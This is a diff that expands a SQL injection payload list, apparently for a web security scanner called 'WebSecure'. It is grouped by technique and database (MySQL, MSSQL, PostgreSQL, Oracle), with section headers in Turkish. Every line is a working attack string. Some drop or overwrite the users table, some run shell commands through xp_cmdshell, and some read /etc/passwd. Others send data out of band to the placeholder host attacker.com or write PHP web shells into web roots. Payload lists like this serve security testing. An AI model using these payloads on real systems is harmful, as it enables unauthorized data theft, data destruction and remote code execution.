@@ -1,87 +1,231 @@
-' OR 1=1--
-' OR '1'='1
-" OR "1"="1
-' OR 1=1#
-" OR 1=1#
-') OR ('1'='1
-admin'--
-admin' #
-' OR 'x'='x
-1 OR 1=1--
-1 AND 1=1--
+# SQL Injection Payloads — WebSecure
+# Error-based | Boolean-blind | Time-based | Union | Stacked | WAF-bypass | OOB
+# MySQL | MSSQL | PostgreSQL | Oracle | SQLite
+
+# ── TEMEL KARAKTER TESTİ ──
+'
+''
+`
+"
+\
+')
+'))
+'--
+'-- -
+'#
+'/*
+"--
+"#
+";
+';
+--
+-- -
+#
+/*
+*/
+/*!
+1'
+1"
+1`
+1)
+1))
+
+# ── ERROR-BASED MySQL ──
+' AND extractvalue(1,concat(0x7e,version()))--
+' AND updatexml(1,concat(0x7e,version()),1)--
+' AND exp(~(SELECT * FROM(SELECT version())x))--
+' AND (SELECT 1 FROM(SELECT count(*),concat(version(),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+' AND geometrycollection((select * from(select * from(select@@version)f)x))--
+' AND polygon((select * from(select * from(select@@version)f)x))--
+' AND multipoint((select * from(select * from(select@@version)f)x))--
+' AND linestring((select * from(select * from(select@@version)f)x))--
+1 AND (SELECT 0x45787472616374) UNION ALL SELECT NULL--
+' AND GTID_SUBSET(CONCAT(0x7e,(SELECT version()),0x7e),1)--
+' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,version())) USING utf8)))--
+
+# ── ERROR-BASED MSSQL ──
+' AND 1=CONVERT(int,@@version)--
+' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--
+'; EXEC xp_cmdshell('whoami')--
+'; EXEC master..xp_cmdshell 'ping -n 3 127.0.0.1'--
+' AND 1=(SELECT CHAR(58)+CHAR(58)+@@version+CHAR(58)+CHAR(58))--
+'; SELECT * FROM openrowset('SQLOLEDB','';'sa';'','select @@version')--
+' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))--
+
+# ── ERROR-BASED PostgreSQL ──
+' AND CAST(version() AS INT)--
+' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS INT)--
+'; SELECT pg_read_file('/etc/passwd')--
+' AND 1=(SELECT 1 FROM pg_sleep(0) WHERE CAST(version() AS TEXT)!='''')--
+' UNION SELECT NULL,NULL,pg_read_file('/etc/passwd')--
+
+# ── ERROR-BASED Oracle ──
+' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE rownum=1))--
+' UNION SELECT NULL,banner,NULL FROM v$version--
+' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))--
+' AND (SELECT UPPER(XMLType(CHR(60)||CHR(58)||(SELECT banner FROM v$version WHERE rownum=1)||CHR(62))) FROM dual) IS NOT NULL--
+'; SELECT dbms_pipe.receive_message('a',3) FROM dual--
+
+# ── BOOLEAN-BLIND ──
 ' AND 1=1--
 ' AND 1=2--
-'='
-'||'1
-"||"1
-'||1='1
-' OR 1=1 LIMIT 1--
-'; SELECT SLEEP(5)--
-'/**/OR/**/1=1--
-' oR 1=1--
+' AND 'a'='a
+' AND 'a'='b
+1 AND 1=1
+1 AND 1=2
+' AND (SELECT 1)=1--
+' AND (SELECT 1)=2--
+' AND (SELECT SUBSTRING(database(),1,1))='a'--
+' AND (SELECT SUBSTRING(user(),1,1))='r'--
+' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--
+' AND ASCII(SUBSTRING((SELECT database()),1,1))>96--
+' AND ASCII(SUBSTRING((SELECT database()),1,1))=109--
+' AND (SELECT COUNT(*) FROM information_schema.tables)>0--
+' AND (SELECT COUNT(*) FROM information_schema.tables)>10--
+') AND ('a'='a
+') AND ('a'='b
+' AND 1 IN (SELECT MIN(name) FROM master..sysobjects WHERE xtype='U' AND name>'.')--
+1 AND (SELECT 1 WHERE 1=1)=1--
+1 AND (SELECT 1 WHERE 1=2)=1--
+
+# ── TIME-BASED BLIND (MySQL) ──
+' AND SLEEP(3)--
+' OR SLEEP(3)--
+' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--
+' AND IF(1=1,SLEEP(3),0)--
+' AND IF(1=2,SLEEP(3),0)--
+' AND IF(ASCII(SUBSTRING(database(),1,1))>90,SLEEP(3),0)--
+' AND IF((SELECT COUNT(*) FROM users)>0,SLEEP(3),0)--
+1 AND SLEEP(3)
+1;SELECT+SLEEP(3)--
+'; SLEEP(3)--
+'; SLEEP(5)--
+'||(SELECT 0x41 WHERE 1=1 AND SLEEP(3))--
+1 RLIKE SLEEP(3)--
+0x41 AND SLEEP(3)--
+EXP(~(SELECT * FROM (SELECT SLEEP(3))x))
+
+# ── TIME-BASED BLIND (MSSQL) ──
+'; WAITFOR DELAY '0:0:3'--
+'; WAITFOR DELAY '0:0:5'--
+'; IF (1=1) WAITFOR DELAY '0:0:3'--
+'; IF (1=2) WAITFOR DELAY '0:0:3'--
+'; IF (SELECT COUNT(*) FROM users)>0 WAITFOR DELAY '0:0:3'--
+1; WAITFOR DELAY '0:0:3'--
+' WAITFOR DELAY '0:0:3'--
+
+# ── TIME-BASED BLIND (PostgreSQL) ──
+'; SELECT pg_sleep(3)--
+'; SELECT pg_sleep(5)--
+' AND 1=(SELECT 1 FROM pg_sleep(3))--
+' OR 1=(SELECT 1 FROM pg_sleep(3))--
+'||(SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE pg_sleep(0) END)--
+'||(SELECT CASE WHEN (1=2) THEN pg_sleep(3) ELSE pg_sleep(0) END)--
+
+# ── TIME-BASED BLIND (Oracle) ──
+'; SELECT dbms_pipe.receive_message(('a'),3) FROM dual--
+'; BEGIN DBMS_LOCK.SLEEP(3); END;--
+' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',3)--
+' AND 1=(SELECT CASE WHEN 1=1 THEN dbms_pipe.receive_message('a',3) ELSE 1 END FROM dual)--
+
+# ── UNION-BASED ──
 ' UNION SELECT NULL--
 ' UNION SELECT NULL,NULL--
 ' UNION SELECT NULL,NULL,NULL--
 ' UNION SELECT NULL,NULL,NULL,NULL--
 ' UNION SELECT NULL,NULL,NULL,NULL,NULL--
-' UNION SELECT @@version,NULL--
-' UNION SELECT user(),NULL--
-' UNION SELECT database(),NULL--
-' UNION SELECT table_name,NULL FROM information_schema.tables--
-' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name=0x7573657273--
-' UNION SELECT username,password FROM users--
-' UNION SELECT 1,username,password FROM users--
-' UNION SELECT load_file('/etc/passwd')--
-" UNION SELECT NULL--
-" UNION SELECT @@version,NULL--
-1 UNION ALL SELECT NULL--
-1 UNION ALL SELECT @@version--
-' AND SLEEP(5)--
-" AND SLEEP(5)--
-1 AND SLEEP(5)--
-1; WAITFOR DELAY '0:0:5'--
-'; WAITFOR DELAY '0:0:5'--
-'; SELECT pg_sleep(5)--
-' AND (SELECT * FROM (SELECT(SLEEP(5)))x)--
-1 OR SLEEP(5)--
-' OR SLEEP(5)--
-1 AND (SELECT 1 FROM (SELECT SLEEP(5))A)
-1); SELECT SLEEP(5); --
-' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--
-' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database())))--
-' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version())),1)--
-' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT version()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
-' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--
-'; EXEC xp_cmdshell('whoami')--
-'; EXEC master..xp_cmdshell('ping attacker.com')--
-1; DROP TABLE users--
-' UNION SELECT 1 FROM dual--
-' ORDER BY 1--
-' ORDER BY 2--
-' ORDER BY 3--
-' ORDER BY 10--
-' GROUP BY 1 HAVING 1=1--
-' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--
-') OR 1=1--
-")) OR 1=1--
-') OR '1'='1'--
-' INTO OUTFILE '/var/www/html/x.php'--
-%27+OR+1=1--
-%27%20OR%201%3D1--
-%2527%2520OR%25201%253D1--
+' UNION ALL SELECT NULL,NULL--
+' UNION ALL SELECT NULL,NULL,NULL--
+' UNION SELECT 1--
+' UNION SELECT 1,2--
+' UNION SELECT 1,2,3--
+' UNION SELECT 1,2,3,4--
+' UNION SELECT 1,2,3,4,5--
 -1 UNION SELECT 1,2,3--
--1' UNION SELECT 1,2,3--
-1) UNION SELECT NULL--
-1') UNION SELECT NULL--
-0x27204f52203d3131--
-1 OR 0x50=0x50--
-' AND EXISTS(SELECT * FROM users WHERE username='admin')--
-'HAVING 1=1--
-' AND (SELECT COUNT(*) FROM users)>0--
-' AND (SELECT TOP 1 name FROM sysobjects WHERE xtype='U')='users'--
-'; SELECT UTL_FILE.PUT_LINE(UTL_FILE.FOPEN('/tmp','x.txt','W'),'test',10) FROM dual--
-' AND 1=UTL_HTTP.REQUEST('http://attacker.com/?d='||(SELECT user FROM dual))--
-1;SELECT SLEEP(5)--
-'; SELECT SLEEP(5); --
-1+1;SELECT SLEEP(5)--
-' AND 1=CTXSYS.DRITHSX.SN(user,(SELECT banner FROM v$version WHERE rownum=1))--
+-1 UNION SELECT 1,database(),3--
+-1 UNION SELECT 1,user(),version()--
+-1 UNION SELECT NULL,NULL,@@version--
+-1 UNION SELECT NULL,table_name,NULL FROM information_schema.tables--
+-1 UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--
+-1 UNION SELECT NULL,group_concat(username,0x3a,password),NULL FROM users--
+-1 UNION SELECT NULL,schema_name,NULL FROM information_schema.schemata--
+0 UNION SELECT NULL,NULL,NULL--
+0 UNION SELECT 1,2,3--
+
+# ── STACKED QUERIES ──
+'; SELECT 1--
+'; SELECT version()--
+'; SELECT user()--
+'; SELECT database()--
+'; SELECT @@hostname--
+'; SELECT load_file('/etc/passwd')--
+'; INSERT INTO users(username,password) VALUES('ws_test','ws_test')--
+'; UPDATE users SET password='pwned' WHERE 1=1--
+'; DROP TABLE users--
+'; EXEC xp_cmdshell('whoami')--
+'; EXEC master..xp_cmdshell 'whoami'--
+'; EXEC master..xp_dirtree '\\attacker.com\x'--
+'; EXEC sp_configure 'show advanced options',1--
+'; RECONFIGURE--
+
+# ── WAF BYPASS ──
+'/*!UNION*//*!SELECT*/NULL,NULL--
+'/*!50000UNION*//*!50000SELECT*/NULL,NULL--
+' UNION%23comment%0ASELECT NULL,NULL--
+'+UNION+SELECT+NULL,NULL--
+'%20UNION%20SELECT%20NULL,NULL--
+'/**/UNION/**/SELECT/**/NULL,NULL--
+'%0AUNION%0ASELECT%0ANULL,NULL--
+'%09UNION%09SELECT%09NULL,NULL--
+' UN/**/ION SEL/**/ECT NULL,NULL--
+' uNiOn sElEcT NULL,NULL--
+' UniOn SeLeCt NULL,NULL--
+1/**/UNION/**/ALL/**/SELECT/**/NULL,NULL,NULL--
+'%u0027 UNION SELECT NULL--
+' /*!50000union*/ /*!50000select*/ null,null--
+' OR/**/'1'='1
+'%0aOR%0a1=1--
+' OR 0x31=0x31--
+' OR char(49)=char(49)--
+'%20OR%20'x'%3d'x
+1'%20OR%20'1'%3d'1
+' oR '1'='1
+' Or '1'='1
+' oR 1=1--
+'/**/or/**/1=1--
+'%09or%091=1--
+1 OR (SELECT * FROM (SELECT(SLEEP(3)))x)
+';EXEC(CHAR(73)+CHAR(78)+CHAR(83)+CHAR(69)+CHAR(82)+CHAR(84))--
+'||'1'='1
+'||1=1--
+' OR 'unusual'='unusual
+' OR 2>1--
+' OR 3-2=1--
+
+# ── OOB (Out-of-Band) ──
+' UNION SELECT LOAD_FILE(CONCAT('\\\\',version(),'.attacker.com\\x'))--
+' AND 1=(SELECT 1 FROM(SELECT count(*),concat((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+'; EXEC master..xp_dirtree '\\attacker.com\x'--
+' AND 1=UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual))--
+' UNION SELECT INTO OUTFILE '/var/www/html/ws_shell.php' FIELDS TERMINATED BY '<?php system($_GET[c]);?>'--
+' INTO OUTFILE '/var/www/shell.php' LINES TERMINATED BY '<?php passthru($_GET[c]);?>'--
+
+# ── EDGE CASES ──
+%27
+%22
+%27%20OR%20%271%27%3D%271
+%22%20OR%20%221%22%3D%221
+\x27
+\x22
+&#39;
+&#x27;
+&apos;
+1 OR 1=1
+1 OR 1=1--
+1 OR 1=1#
+1) OR (1=1
+1)) OR ((1=1
+(1)OR(1)=(1)
+1'1
+a'or'1'='1
+a"or"1"="1
